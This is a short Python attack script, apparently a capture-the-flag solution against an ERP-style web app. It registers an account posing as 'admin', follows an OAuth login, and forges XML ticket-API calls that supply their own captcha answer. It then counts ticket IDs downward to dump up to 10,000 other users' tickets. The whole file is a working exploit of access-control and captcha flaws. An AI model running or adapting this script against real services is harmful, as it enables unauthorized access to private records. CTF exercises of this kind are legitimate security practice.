#!/usr/bin/env python3

import requests
import json
import string
import random
import sys

s = requests.Session()

random_text = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))

host = sys.argv[1]
r = s.post('http://{}:5000/register'.format(host), data={
    'first_name': random_text,
    'family_name': random_text,
    'nickname': 'admin',
    'email': 'admin@gmail.com',
    'password': random_text,
    'confirm': random_text,
})

r = s.post('http://{}:5000/login'.format(host), data={
    'email': 'admin@gmail.com',
    'password': random_text
})

r = s.post('http://{}:8080/oauth2/authorization/custom'.format(host))

r = s.post(r.url)

r = s.post('http://{}:8080/api/tickets/'.format(host), data='<?xml version="1.0" encoding="UTF-8" standalone="yes" ?><methodCall name="create"><arguments><type>com.mhackectf.erp.Api.dto.CreateTicketDto</type><value><CreateTicketDto><title>test</title><content>test</content><author>test</author><priority>critical</priority></CreateTicketDto></value></arguments></methodCall>')

ticket_id = json.loads(r.text)['id']

for i in range(10000):
    r = s.post('http://{}:8080/api/tickets/'.format(host), data='<?xml version="1.0" encoding="UTF-8" standalone="yes" ?><methodCall name="get"><arguments><type>com.mhackectf.erp.Api.dto.GetTicketDto</type><value><GetTicketDto><ticketID>' + str(ticket_id) + '</ticketID><captcha>2*2</captcha><userInsertedCaptcha>4</userInsertedCaptcha></GetTicketDto></value></arguments></methodCall>')
    ticket_id -= 1
    if ticket_id < 0:
      break
    print(r.text, flush=True)

